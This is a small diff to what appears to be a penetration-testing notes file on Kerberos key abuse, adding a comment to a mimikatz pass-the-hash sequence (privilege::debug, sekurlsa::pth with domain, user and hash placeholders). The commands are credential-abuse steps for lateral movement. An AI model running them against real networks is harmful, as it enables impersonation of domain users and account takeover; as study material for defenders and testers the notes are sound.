@@ -29,4 +29,5 @@ We must pay attention to AES256_HMAC and RC4_HMAC keys, as we can use them to fo
 mimikatz.exe
 privilege::debug
 sekurlsa::pth /domain:<domain> /user:<username> /<ntlm/rc4>: <hash>
+#As result, a new cmd window will be opened with specific user's TGT
 ```
